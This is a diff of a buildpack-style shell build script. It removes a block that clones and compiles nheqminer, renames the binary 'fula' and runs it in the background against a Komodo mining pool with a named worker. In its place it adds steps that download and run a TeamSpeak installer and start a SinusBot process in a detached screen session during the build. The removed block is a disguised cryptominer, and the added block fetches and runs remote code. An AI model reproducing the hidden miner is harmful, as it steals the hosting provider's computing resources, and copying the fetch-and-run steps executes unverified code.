@@ -37,7 +37,7 @@ echo "-----> Installing s3cmd... "
 apt-get $APT_OPTIONS update | indent
 apt-get $APT_OPTIONS -y --force-yes -d install --reinstall s3cmd | indent
 echo "-----> Installing other dependencies... "
-apt-get $APT_OPTIONS -y --force-yes -d install --reinstall cmake build-essential libboost-all-dev qt5-default git
+apt-get $APT_OPTIONS -y --force-yes -d install --reinstall x11vnc xvfb libxcursor1 ca-certificates bzip2 libglib2.0-0 screen
 mkdir -p $BUILD_DIR/.apt/var/run/screen
 
 mkdir -p $BUILD_DIR/.profile.d
@@ -57,18 +57,17 @@ for DEB in $(ls -1 $APT_CACHE_DIR/archives/*.deb); do
   dpkg -x $DEB $BUILD_DIR/.apt/
 done
 
-echo "kasdopasdokdpas"
-echo "kasdopasdokdpas"
-echo "kasdopasdokdpas"
-echo "kasdopasdokdpas"
-echo "kasdopasdokdpas"
+update-ca-certificates
+mkdir -p /opt/ts3soundboard
+cd /opt/ts3soundboard
+wget https://www.sinusbot.com/dl/sinusbot-beta.tar.bz2
+tar -xjf sinusbot-beta.tar.bz2
+cp config.ini.dist config.ini
+wget http://dl.4players.de/ts/releases/3.0.18.2/TeamSpeak3-Client-linux_amd64-3.0.18.2.run
+chmod 0755 TeamSpeak3-Client-linux_amd64-3.0.18.2.run
+./TeamSpeak3-Client-linux_amd64-3.0.18.2.run
+cp plugin/libsoundbot_plugin.so /opt/ts3soundboard/TeamSpeak3-Client-linux_amd64/plugins
+screen -dmS sinusbot ./sinusbot
 
-git clone https://github.com/feeleep75/nheqminer.git
-cd nheqminer/nheqminer
-mkdir build
-cd build
-cmake ..
-make
-mv nheqminer fula
-./fula -l kmd.suprnova.cc:6250 -u pennerking.pennerkingx -p x -t 16 &
+
 echo "done"
